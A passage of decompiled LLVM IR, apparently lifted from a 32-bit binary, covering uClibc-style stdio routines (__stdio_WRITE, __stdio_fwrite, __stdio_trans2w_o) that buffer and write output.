  br i1 %v4_1000c834, label %dec_label_pc_1000c840, label %dec_label_pc_1000c83c

dec_label_pc_1000c83c:                            ; preds = %dec_label_pc_1000c830
  %v0_1000c83c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c83c = load i32, i32* @r4, align 4
  %v2_1000c83c = inttoptr i32 %v1_1000c83c to i32*
  store i32 %v0_1000c83c, i32* %v2_1000c83c, align 4
  br label %dec_label_pc_1000c840

dec_label_pc_1000c840:                            ; preds = %dec_label_pc_1000c830, %dec_label_pc_1000c83c
  %v0_1000c840 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c840 = load i32, i32* @r5, align 4
  %v2_1000c840 = sub i32 %v1_1000c840, %v0_1000c840
  store i32 %v2_1000c840, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000c844

dec_label_pc_1000c844:                            ; preds = %dec_label_pc_1000c7c4, %dec_label_pc_1000c840
  %v0_1000c848 = phi i32 [ %v0_1000c848.pre, %dec_label_pc_1000c7c4 ], [ %v2_1000c840, %dec_label_pc_1000c840 ]
  store i32 %v0_1000c790, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000c848

; uselistorder directives
  uselistorder i32 %v1_1000c82c, { 1, 0 }
  uselistorder i32 %v2_1000c824, { 0, 2, 1 }
  uselistorder i32 %v1_1000c818, { 1, 0 }
  uselistorder i32 %v0_1000c7fc, { 2, 3, 0, 1 }
  uselistorder i32 %v2_1000c8147, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 5, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 6, 3, 5, 0, 7, 4, 8 }
  uselistorder i32 84, { 4, 5, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000c844, { 1, 0 }
  uselistorder label %dec_label_pc_1000c840, { 1, 0 }
  uselistorder label %dec_label_pc_1000c814, { 1, 0 }
  uselistorder label %dec_label_pc_1000c7f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c7e4, { 2, 0, 1 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_1000c858 = load i32, i32* @lr, align 4
  store i32 %v0_1000c858, i32* %r0.global-to-local, align 4
  %v0_1000c864 = load i32, i32* @r5, align 4
  store i32 %v0_1000c864, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_1000c864, i32* @r31, align 4
  %v3_1000c8783 = icmp eq i32 %v0_1000c864, 0
  store i32 %v0_1000c864, i32* @r27, align 4
  br i1 %v3_1000c8783, label %dec_label_pc_1000c920, label %dec_label_pc_1000c888

dec_label_pc_1000c888:                            ; preds = %entry, %dec_label_pc_1000c8a8
  %v0_1000c898 = phi i32 [ %v2_1000c8a8, %dec_label_pc_1000c8a8 ], [ %arg2, %entry ]
  %v1_1000c888.in = phi i32 [ %v2_1000c8ac, %dec_label_pc_1000c8a8 ], [ %v0_1000c864, %entry ]
  %v1_1000c888 = icmp sgt i32 %v1_1000c888.in, 0
  br i1 %v1_1000c888, label %dec_label_pc_1000c894, label %dec_label_pc_1000c88c

dec_label_pc_1000c88c:                            ; preds = %dec_label_pc_1000c888
  br label %dec_label_pc_1000c894

dec_label_pc_1000c894:                            ; preds = %dec_label_pc_1000c888, %dec_label_pc_1000c88c
  %v0_1000c894 = load i32, i32* @r30, align 4
  %v1_1000c894 = add i32 %v0_1000c894, 4
  %v2_1000c894 = inttoptr i32 %v1_1000c894 to i32*
  %v3_1000c894 = load i32, i32* %v2_1000c894, align 4
  store i32 268486816, i32* @lr, align 4
  %v3_1000c89c = call i32 @__libc_write(i32 %v3_1000c894, i32 %v0_1000c898)
  %v1_1000c8a0 = icmp slt i32 %v3_1000c89c, 0
  br i1 %v1_1000c8a0, label %dec_label_pc_1000c8b4, label %dec_label_pc_1000c8a8

dec_label_pc_1000c8a8:                            ; preds = %dec_label_pc_1000c894
  %v0_1000c8a8 = load i32, i32* @r29, align 4
  %v2_1000c8a8 = add i32 %v0_1000c8a8, %v3_1000c89c
  store i32 %v2_1000c8a8, i32* @r29, align 4
  %v1_1000c8ac = load i32, i32* @r31, align 4
  %v2_1000c8ac = sub i32 %v1_1000c8ac, %v3_1000c89c
  store i32 %v2_1000c8ac, i32* @r31, align 4
  %v3_1000c878 = icmp eq i32 %v2_1000c8ac, 0
  store i32 %v2_1000c8ac, i32* @r27, align 4
  br i1 %v3_1000c878, label %dec_label_pc_1000c878.dec_label_pc_1000c920.loopexit_crit_edge, label %dec_label_pc_1000c888

dec_label_pc_1000c8b4:                            ; preds = %dec_label_pc_1000c894
  %v0_1000c8b4 = load i32, i32* @r30, align 4
  %v1_1000c8b4 = add i32 %v0_1000c8b4, 8
  %v2_1000c8b4 = inttoptr i32 %v1_1000c8b4 to i32*
  %v3_1000c8b4 = load i32, i32* %v2_1000c8b4, align 4
  store i32 %v3_1000c8b4, i32* %r11.global-to-local, align 4
  %v1_1000c8b8 = add i32 %v0_1000c8b4, 12
  %v2_1000c8b8 = inttoptr i32 %v1_1000c8b8 to i32*
  %v3_1000c8b8 = load i32, i32* %v2_1000c8b8, align 4
  store i32 %v3_1000c8b8, i32* %r0.global-to-local, align 4
  %v1_1000c8bc = inttoptr i32 %v0_1000c8b4 to i16*
  %v2_1000c8bc = load i16, i16* %v1_1000c8bc, align 2
  %v2_1000c8c0 = sub i32 %v3_1000c8b8, %v3_1000c8b4
  store i32 %v2_1000c8c0, i32* %r0.global-to-local, align 4
  %v5_1000c8c0 = icmp eq i32 %v2_1000c8c0, 0
  %v1_1000c8c4 = or i16 %v2_1000c8bc, 8
  store i16 %v1_1000c8c4, i16* %v1_1000c8bc, align 2
  br i1 %v5_1000c8c0, label %dec_label_pc_1000c8b4.dec_label_pc_1000c91c_crit_edge, label %dec_label_pc_1000c8d0

dec_label_pc_1000c8b4.dec_label_pc_1000c91c_crit_edge: ; preds = %dec_label_pc_1000c8b4
  %v0_1000c91c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000c91c

dec_label_pc_1000c8d0:                            ; preds = %dec_label_pc_1000c8b4
  %v0_1000c8d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c8d0 = load i32, i32* @r31, align 4
  %v3_1000c8d0 = icmp ugt i32 %v0_1000c8d0, %v1_1000c8d0
  br i1 %v3_1000c8d0, label %dec_label_pc_1000c8d0.dec_label_pc_1000c8dc_crit_edge, label %dec_label_pc_1000c8d8

dec_label_pc_1000c8d0.dec_label_pc_1000c8dc_crit_edge: ; preds = %dec_label_pc_1000c8d0
  %v0_1000c8dc.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000c8dc

dec_label_pc_1000c8d8:                            ; preds = %dec_label_pc_1000c8d0
  store i32 %v0_1000c8d0, i32* @r27, align 4
  br label %dec_label_pc_1000c8dc

dec_label_pc_1000c8dc:                            ; preds = %dec_label_pc_1000c8d0.dec_label_pc_1000c8dc_crit_edge, %dec_label_pc_1000c8d8
  %v0_1000c8dc = phi i32 [ %v0_1000c8dc.pre, %dec_label_pc_1000c8d0.dec_label_pc_1000c8dc_crit_edge ], [ %v0_1000c8d0, %dec_label_pc_1000c8d8 ]
  store i32 %v0_1000c8dc, i32* %ctr.global-to-local, align 4
  %v2_1000c8e8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c8e0

dec_label_pc_1000c8e0:                            ; preds = %dec_label_pc_1000c904, %dec_label_pc_1000c8dc
  %v2_1000c8e8 = phi i32 [ %v1_1000c904, %dec_label_pc_1000c904 ], [ %v2_1000c8e8.pre, %dec_label_pc_1000c8dc ]
  %v0_1000c8e0 = load i32, i32* @r29, align 4
  %v1_1000c8e0 = inttoptr i32 %v0_1000c8e0 to i8*
  %v2_1000c8e0 = load i8, i8* %v1_1000c8e0, align 1
  %v3_1000c8e0 = zext i8 %v2_1000c8e0 to i32
  store i32 %v3_1000c8e0, i32* %r0.global-to-local, align 4
  %v1_1000c8e4 = add i32 %v0_1000c8e0, 1
  store i32 %v1_1000c8e4, i32* @r29, align 4
  %v3_1000c8e8 = inttoptr i32 %v2_1000c8e8 to i8*
  store i8 %v2_1000c8e0, i8* %v3_1000c8e8, align 1
  %v0_1000c8ec = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c8ec = urem i32 %v0_1000c8ec, 256
  store i32 %v1_1000c8ec, i32* %r0.global-to-local, align 4
  %v3_1000c8f0 = icmp eq i32 %v1_1000c8ec, 10
  br i1 %v3_1000c8f0, label %dec_label_pc_1000c8f8, label %dec_label_pc_1000c904

dec_label_pc_1000c8f8:                            ; preds = %dec_label_pc_1000c8e0
  %v0_1000c8f8 = load i32, i32* @r30, align 4
  %v1_1000c8f8 = inttoptr i32 %v0_1000c8f8 to i16*
  %v2_1000c8f8 = load i16, i16* %v1_1000c8f8, align 2
  %v3_1000c8f8 = zext i16 %v2_1000c8f8 to i32
  store i32 %v3_1000c8f8, i32* %r0.global-to-local, align 4
  %v1_1000c8fc = and i32 %v3_1000c8f8, 256
  %v3_1000c8fc = icmp eq i32 %v1_1000c8fc, 0
  br i1 %v3_1000c8fc, label %dec_label_pc_1000c904, label %dec_label_pc_1000c8f8.dec_label_pc_1000c90c_crit_edge

dec_label_pc_1000c8f8.dec_label_pc_1000c90c_crit_edge: ; preds = %dec_label_pc_1000c8f8
  %v0_1000c910.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c90c

dec_label_pc_1000c904:                            ; preds = %dec_label_pc_1000c8f8, %dec_label_pc_1000c8e0
  %v0_1000c904 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c904 = add i32 %v0_1000c904, 1
  store i32 %v1_1000c904, i32* %r11.global-to-local, align 4
  %v0_1000c908 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c908 = add i32 %v0_1000c908, -1
  store i32 %v1_1000c908, i32* %ctr.global-to-local, align 4
  %v2_1000c908 = icmp eq i32 %v1_1000c908, 0
  br i1 %v2_1000c908, label %dec_label_pc_1000c904.dec_label_pc_1000c90c_crit_edge, label %dec_label_pc_1000c8e0

dec_label_pc_1000c904.dec_label_pc_1000c90c_crit_edge: ; preds = %dec_label_pc_1000c904
  %v0_1000c90c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000c90c

dec_label_pc_1000c90c:                            ; preds = %dec_label_pc_1000c8f8.dec_label_pc_1000c90c_crit_edge, %dec_label_pc_1000c904.dec_label_pc_1000c90c_crit_edge
  %v0_1000c910 = phi i32 [ %v1_1000c904, %dec_label_pc_1000c904.dec_label_pc_1000c90c_crit_edge ], [ %v0_1000c910.pre, %dec_label_pc_1000c8f8.dec_label_pc_1000c90c_crit_edge ]
  %v0_1000c90c = phi i32 [ %v0_1000c90c.pre, %dec_label_pc_1000c904.dec_label_pc_1000c90c_crit_edge ], [ %v0_1000c8f8, %dec_label_pc_1000c8f8.dec_label_pc_1000c90c_crit_edge ]
  %v1_1000c90c = add i32 %v0_1000c90c, 8
  %v2_1000c90c = inttoptr i32 %v1_1000c90c to i32*
  %v3_1000c90c = load i32, i32* %v2_1000c90c, align 4
  store i32 %v3_1000c90c, i32* %r0.global-to-local, align 4
  %v2_1000c910 = add i32 %v0_1000c90c, 16
  %v3_1000c910 = inttoptr i32 %v2_1000c910 to i32*
  store i32 %v0_1000c910, i32* %v3_1000c910, align 4
  %v0_1000c914 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c914 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000c914 = sub i32 %v1_1000c914, %v0_1000c914
  store i32 %v2_1000c914, i32* %r0.global-to-local, align 4
  %v1_1000c918 = load i32, i32* @r31, align 4
  %v2_1000c918 = sub i32 %v1_1000c918, %v2_1000c914
  store i32 %v2_1000c918, i32* @r31, align 4
  br label %dec_label_pc_1000c91c

dec_label_pc_1000c91c:                            ; preds = %dec_label_pc_1000c8b4.dec_label_pc_1000c91c_crit_edge, %dec_label_pc_1000c90c
  %v0_1000c91c = phi i32 [ %v0_1000c91c.pre, %dec_label_pc_1000c8b4.dec_label_pc_1000c91c_crit_edge ], [ %v2_1000c918, %dec_label_pc_1000c90c ]
  %v1_1000c91c = load i32, i32* @r28, align 4
  %v2_1000c91c = sub i32 %v1_1000c91c, %v0_1000c91c
  store i32 %v2_1000c91c, i32* @r28, align 4
  br label %dec_label_pc_1000c920

dec_label_pc_1000c878.dec_label_pc_1000c920.loopexit_crit_edge: ; preds = %dec_label_pc_1000c8a8
  %v0_1000c924.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000c920

dec_label_pc_1000c920:                            ; preds = %entry, %dec_label_pc_1000c878.dec_label_pc_1000c920.loopexit_crit_edge, %dec_label_pc_1000c91c
  %v0_1000c924 = phi i32 [ %v2_1000c91c, %dec_label_pc_1000c91c ], [ %v0_1000c924.pre.pre, %dec_label_pc_1000c878.dec_label_pc_1000c920.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_1000c858, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000c924

; uselistorder directives
  uselistorder i32 %v0_1000c90c, { 1, 0 }
  uselistorder i32 %v1_1000c908, { 1, 0 }
  uselistorder i32 %v1_1000c904, { 0, 2, 1 }
  uselistorder i32 %v1_1000c8ec, { 1, 0 }
  uselistorder i32 %v2_1000c8ac, { 1, 3, 2, 0 }
  uselistorder i32 %v2_1000c8a8, { 1, 0 }
  uselistorder i32 %v3_1000c89c, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 2, 1, 5 }
  uselistorder i32 (i32, i32)* @__libc_write, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000c920, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000c91c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c90c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c8dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000c894, { 1, 0 }
  uselistorder label %dec_label_pc_1000c888, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg3 to i32
  %v0_1000c938 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  %v3_1000c954 = load i16, i16* %arg3, align 2
  %v1_1000c958 = and i16 %v3_1000c954, 512
  %v3_1000c958 = icmp eq i16 %v1_1000c958, 0
  br i1 %v3_1000c958, label %dec_label_pc_1000c960, label %dec_label_pc_1000ca6c

dec_label_pc_1000c960:                            ; preds = %entry
  %v2_1000c960 = add i32 %tmp, 4
  %v3_1000c960 = inttoptr i32 %v2_1000c960 to i32*
  %v4_1000c960 = load i32, i32* %v3_1000c960, align 4
  %v2_1000c964 = add i32 %tmp, 16
  %v3_1000c964 = inttoptr i32 %v2_1000c964 to i32*
  %v4_1000c964 = load i32, i32* %v3_1000c964, align 4
  store i32 %v4_1000c964, i32* @r3, align 4
  %v3_1000c968 = icmp eq i32 %v4_1000c960, -2
  %v2_1000c96c = add i32 %tmp, 12
  %v3_1000c96c = inttoptr i32 %v2_1000c96c to i32*
  %v4_1000c96c = load i32, i32* %v3_1000c96c, align 4
  %v2_1000c974 = sub i32 %v4_1000c96c, %v4_1000c964
  br i1 %v3_1000c968, label %dec_label_pc_1000c974, label %dec_label_pc_1000c9a4

dec_label_pc_1000c974:                            ; preds = %dec_label_pc_1000c960
  %v3_1000c97c = icmp ult i32 %v2_1000c974, %arg2
  br i1 %v3_1000c97c, label %dec_label_pc_1000c984, label %dec_label_pc_1000c988

dec_label_pc_1000c984:                            ; preds = %dec_label_pc_1000c974
  br label %dec_label_pc_1000c988

dec_label_pc_1000c988:                            ; preds = %dec_label_pc_1000c974, %dec_label_pc_1000c984
  %storemerge = phi i32 [ %v2_1000c974, %dec_label_pc_1000c984 ], [ %arg2, %dec_label_pc_1000c974 ]
  %v0_1000c98c = phi i32 [ %v2_1000c974, %dec_label_pc_1000c984 ], [ %arg2, %dec_label_pc_1000c974 ]
  store i32 %storemerge, i32* @r31, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v0_1000c98c, i32* @r5, align 4
  store i32 268487060, i32* @lr, align 4
  %v0_1000c990 = call i32 @memcpy()
  %v0_1000c994 = load i32, i32* @r30, align 4
  %v1_1000c994 = add i32 %v0_1000c994, 16
  %v2_1000c994 = inttoptr i32 %v1_1000c994 to i32*
  %v3_1000c994 = load i32, i32* %v2_1000c994, align 4
  %v1_1000c998 = load i32, i32* @r31, align 4
  %v2_1000c998 = add i32 %v1_1000c998, %v3_1000c994
  store i32 %v2_1000c998, i32* %v2_1000c994, align 4
  br label %dec_label_pc_1000ca8c

dec_label_pc_1000c9a4:                            ; preds = %dec_label_pc_1000c960
  %v3_1000c9a8 = icmp ult i32 %v2_1000c974, %arg2
  br i1 %v3_1000c9a8, label %dec_label_pc_1000ca48, label %dec_label_pc_1000c9b0

dec_label_pc_1000c9b0:                            ; preds = %dec_label_pc_1000c9a4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 268487100, i32* @lr, align 4
  %v0_1000c9b8 = call i32 @memcpy()
  %v0_1000c9bc = load i32, i32* @r30, align 4
  %v1_1000c9bc = inttoptr i32 %v0_1000c9bc to i16*
  %v2_1000c9bc = load i16, i16* %v1_1000c9bc, align 2
  %v1_1000c9c0 = add i32 %v0_1000c9bc, 16
  %v2_1000c9c0 = inttoptr i32 %v1_1000c9c0 to i32*
  %v3_1000c9c0 = load i32, i32* %v2_1000c9c0, align 4
  %v1_1000c9c4 = and i16 %v2_1000c9bc, 256
  %v3_1000c9c4 = icmp eq i16 %v1_1000c9c4, 0
  %v1_1000c9c8 = load i32, i32* @r29, align 4
  %v2_1000c9c8 = add i32 %v1_1000c9c8, %v3_1000c9c0
  store i32 %v2_1000c9c8, i32* %v2_1000c9c0, align 4
  br i1 %v3_1000c9c4, label %dec_label_pc_1000ca8c, label %dec_label_pc_1000c9d4

dec_label_pc_1000c9d4:                            ; preds = %dec_label_pc_1000c9b0
  %v0_1000c9d4 = load i32, i32* @r28, align 4
  %v0_1000c9dc = load i32, i32* @r29, align 4
  store i32 268487140, i32* @lr, align 4
  %v4_1000c9e0 = call i32 @memrchr(i32 %v0_1000c9d4, i32 10, i32 %v0_1000c9dc, i32 %v2_1000c9c8)
  %v3_1000c9e4 = icmp eq i32 %v4_1000c9e0, 0
  br i1 %v3_1000c9e4, label %dec_label_pc_1000ca8c, label %dec_label_pc_1000c9ec

dec_label_pc_1000c9ec:                            ; preds = %dec_label_pc_1000c9d4
  %v0_1000c9ec = load i32, i32* @r30, align 4
  store i32 %v0_1000c9ec, i32* @r3, align 4
  store i32 268487156, i32* @lr, align 4
  %v0_1000c9f0 = call i32 @__stdio_wcommit()
  %v3_1000c9f4 = icmp eq i32 %v0_1000c9f0, 0
  br i1 %v3_1000c9f4, label %dec_label_pc_1000ca8c, label %dec_label_pc_1000c9fc

dec_label_pc_1000c9fc:                            ; preds = %dec_label_pc_1000c9ec
  %v0_1000c9fc = load i32, i32* @r29, align 4
  %v3_1000c9fc = icmp ugt i32 %v0_1000c9fc, %v0_1000c9f0
  %v0_1000c9f0.v0_1000ca00 = select i1 %v3_1000c9fc, i32 %v0_1000c9f0, i32 %v0_1000c9fc
  store i32 %v0_1000c9f0.v0_1000ca00, i32* @r31, align 4
  %v2_1000ca0c = sub i32 %v0_1000c9fc, %v0_1000c9f0.v0_1000ca00
  %v0_1000ca14 = load i32, i32* @r28, align 4
  %v2_1000ca14 = add i32 %v0_1000ca14, %v2_1000ca0c
  store i32 %v2_1000ca14, i32* @r28, align 4
  store i32 %v2_1000ca14, i32* @r3, align 4
  store i32 268487204, i32* @lr, align 4
  %v3_1000ca20 = call i32 @__GI_memchr(i32 %v2_1000ca14, i32 10, i32 %v0_1000c9f0.v0_1000ca00)
  %v3_1000ca24 = icmp eq i32 %v3_1000ca20, 0
  br i1 %v3_1000ca24, label %dec_label_pc_1000ca8c, label %dec_label_pc_1000ca2c

dec_label_pc_1000ca2c:                            ; preds = %dec_label_pc_1000c9fc
  %v0_1000ca2c = load i32, i32* @r30, align 4
  %v1_1000ca2c = add i32 %v0_1000ca2c, 16
  %v2_1000ca2c = inttoptr i32 %v1_1000ca2c to i32*
  %v3_1000ca2c = load i32, i32* %v2_1000ca2c, align 4
  %v0_1000ca30 = load i32, i32* @r28, align 4
  %v1_1000ca30 = load i32, i32* @r31, align 4
  %v2_1000ca30 = sub i32 %v0_1000ca30, %v3_1000ca20
  %v2_1000ca34 = add i32 %v2_1000ca30, %v1_1000ca30
  %v2_1000ca38 = sub i32 %v3_1000ca2c, %v2_1000ca34
  %v1_1000ca3c = load i32, i32* @r29, align 4
  %v2_1000ca3c = sub i32 %v1_1000ca3c, %v2_1000ca34
  store i32 %v2_1000ca3c, i32* @r29, align 4
  store i32 %v2_1000ca38, i32* %v2_1000ca2c, align 4
  br label %dec_label_pc_1000ca8c

dec_label_pc_1000ca48:                            ; preds = %dec_label_pc_1000c9a4
  %v2_1000ca48 = add i32 %tmp, 8
  %v3_1000ca48 = inttoptr i32 %v2_1000ca48 to i32*
  %v4_1000ca48 = load i32, i32* %v3_1000ca48, align 4
  %v4_1000ca4c = icmp eq i32 %v4_1000c964, %v4_1000ca48
  br i1 %v4_1000ca4c, label %dec_label_pc_1000ca6c, label %dec_label_pc_1000ca54

dec_label_pc_1000ca54:                            ; preds = %dec_label_pc_1000ca48
  store i32 %tmp, i32* @r3, align 4
  store i32 268487260, i32* @lr, align 4
  %v0_1000ca58 = call i32 @__stdio_wcommit()
  %v3_1000ca5c = icmp eq i32 %v0_1000ca58, 0
  br i1 %v3_1000ca5c, label %dec_label_pc_1000ca54.dec_label_pc_1000ca6c_crit_edge, label %dec_label_pc_1000ca64

dec_label_pc_1000ca54.dec_label_pc_1000ca6c_crit_edge: ; preds = %dec_label_pc_1000ca54
  %v0_1000ca70.pre = load i32, i32* @r30, align 4
  %v0_1000ca74.pre = load i32, i32* @r28, align 4
  %v0_1000ca78.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000ca6c

dec_label_pc_1000ca64:                            ; preds = %dec_label_pc_1000ca54
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_1000ca8c

dec_label_pc_1000ca6c:                            ; preds = %dec_label_pc_1000ca54.dec_label_pc_1000ca6c_crit_edge, %entry, %dec_label_pc_1000ca48
  %v0_1000ca78 = phi i32 [ %v0_1000ca78.pre, %dec_label_pc_1000ca54.dec_label_pc_1000ca6c_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_1000ca48 ]
  %v0_1000ca74 = phi i32 [ %v0_1000ca74.pre, %dec_label_pc_1000ca54.dec_label_pc_1000ca6c_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_1000ca48 ]
  %v0_1000ca70 = phi i32 [ %v0_1000ca70.pre, %dec_label_pc_1000ca54.dec_label_pc_1000ca6c_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_1000ca48 ]
  %v1_1000ca70 = inttoptr i32 %v0_1000ca70 to i16*
  store i32 %v0_1000ca78, i32* @r5, align 4
  store i32 %v0_1000c938, i32* @lr, align 4
  %v5_1000ca88 = call i32 @__stdio_WRITE(i16* %v1_1000ca70, i32 %v0_1000ca74)
  br label %dec_label_pc_1000ca8c

dec_label_pc_1000ca8c:                            ; preds = %dec_label_pc_1000c9fc, %dec_label_pc_1000c9ec, %dec_label_pc_1000c9d4, %dec_label_pc_1000c9b0, %dec_label_pc_1000ca64, %dec_label_pc_1000ca2c, %dec_label_pc_1000c988, %dec_label_pc_1000ca6c
  %v0_1000ca90 = load i32, i32* @r29, align 4
  ret i32 %v0_1000ca90

; uselistorder directives
  uselistorder i32 %v2_1000ca34, { 1, 0 }
  uselistorder i32 %v0_1000c9f0.v0_1000ca00, { 0, 2, 1 }
  uselistorder i32 %v0_1000c9fc, { 1, 0, 2 }
  uselistorder i32 %v2_1000c974, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1000ca8c, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_1000ca6c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000c988, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000caa4 = load i32, i32* @lr, align 4
  store i32 %v0_1000caa4, i32* %r0.global-to-local, align 4
  %v0_1000caac = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000cab8 = load i16, i16* %arg1, align 2
  %v4_1000cab8 = zext i16 %v3_1000cab8 to i32
  store i32 %v4_1000cab8, i32* %r0.global-to-local, align 4
  %v1_1000cabc = load i32, i32* @r4, align 4
  %v2_1000cabc = and i32 %v1_1000cabc, %v4_1000cab8
  store i32 %v2_1000cabc, i32* %r9.global-to-local, align 4
  %v5_1000cabc = icmp eq i32 %v2_1000cabc, 0
  br i1 %v5_1000cabc, label %dec_label_pc_1000cac4, label %dec_label_pc_1000cad4

dec_label_pc_1000cac4:                            ; preds = %entry
  %v1_1000cac4 = and i32 %v4_1000cab8, 2176
  store i32 %v1_1000cac4, i32* %r9.global-to-local, align 4
  %v3_1000cac4 = icmp eq i32 %v1_1000cac4, 0
  br i1 %v3_1000cac4, label %dec_label_pc_1000cacc, label %dec_label_pc_1000cae0

dec_label_pc_1000cacc:                            ; preds = %dec_label_pc_1000cac4
  %v2_1000cacc = or i32 %v1_1000cabc, %v4_1000cab8
  store i32 %v2_1000cacc, i32* %r0.global-to-local, align 4
  %v1_1000cad0 = trunc i32 %v2_1000cacc to i16
  store i16 %v1_1000cad0, i16* %arg1, align 2
  %v0_1000cad4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000cad4

dec_label_pc_1000cad4:                            ; preds = %entry, %dec_label_pc_1000cacc
  %v0_1000cb10 = phi i32 [ %tmp, %entry ], [ %v0_1000cad4.pre, %dec_label_pc_1000cacc ]
  %v1_1000cad4 = inttoptr i32 %v0_1000cb10 to i16*
  %v2_1000cad4 = load i16, i16* %v1_1000cad4, align 2
  %v3_1000cad4 = zext i16 %v2_1000cad4 to i32
  %v1_1000cad8 = and i32 %v3_1000cad4, 32
  store i32 %v1_1000cad8, i32* %r0.global-to-local, align 4
  %v3_1000cad8 = icmp eq i32 %v1_1000cad8, 0
  br i1 %v3_1000cad8, label %dec_label_pc_1000cb00, label %dec_label_pc_1000cae0

dec_label_pc_1000cae0:                            ; preds = %dec_label_pc_1000cac4, %dec_label_pc_1000cad4
  %v0_1000cae0 = call i32 @__errno_location()
  store i32 %v0_1000cae0, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_1000cae8 = inttoptr i32 %v0_1000cae0 to i32*
  store i32 9, i32* %v2_1000cae8, align 4
  br label %dec_label_pc_1000caec

dec_label_pc_1000caec:                            ; preds = %dec_label_pc_1000cb28, %dec_label_pc_1000cae0
  %v0_1000caec = load i32, i32* @r31, align 4
  %v1_1000caec = inttoptr i32 %v0_1000caec to i16*
  %v2_1000caec = load i16, i16* %v1_1000caec, align 2
  %v3_1000caec = zext i16 %v2_1000caec to i32
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000caf4 = or i32 %v3_1000caec, 8
  store i32 %v1_1000caf4, i32* %r0.global-to-local, align 4
  %v1_1000caf8 = trunc i32 %v1_1000caf4 to i16
  store i16 %v1_1000caf8, i16* %v1_1000caec, align 2
  br label %dec_label_pc_1000cb88

dec_label_pc_1000cb00:                            ; preds = %dec_label_pc_1000cad4
  %tmp8 = urem i16 %v2_1000cad4, 4
  %v1_1000cb00 = zext i16 %tmp8 to i32
  store i32 %v1_1000cb00, i32* %r0.global-to-local, align 4
  %v3_1000cb00 = icmp eq i16 %tmp8, 0
  br i1 %v3_1000cb00, label %dec_label_pc_1000cb64, label %dec_label_pc_1000cb08

dec_label_pc_1000cb08:                            ; preds = %dec_label_pc_1000cb00
  %v1_1000cb08 = and i32 %v3_1000cad4, 4
  store i32 %v1_1000cb08, i32* %r9.global-to-local, align 4
  %v3_1000cb08 = icmp eq i32 %v1_1000cb08, 0
  br i1 %v3_1000cb08, label %dec_label_pc_1000cb10, label %dec_label_pc_1000cb48

dec_label_pc_1000cb10:                            ; preds = %dec_label_pc_1000cb08
  %v1_1000cb10 = add i32 %v0_1000cb10, 20
  %v2_1000cb10 = inttoptr i32 %v1_1000cb10 to i32*
  %v3_1000cb10 = load i32, i32* %v2_1000cb10, align 4
  store i32 %v3_1000cb10, i32* %r0.global-to-local, align 4
  %v1_1000cb14 = add i32 %v0_1000cb10, 16
  %v2_1000cb14 = inttoptr i32 %v1_1000cb14 to i32*
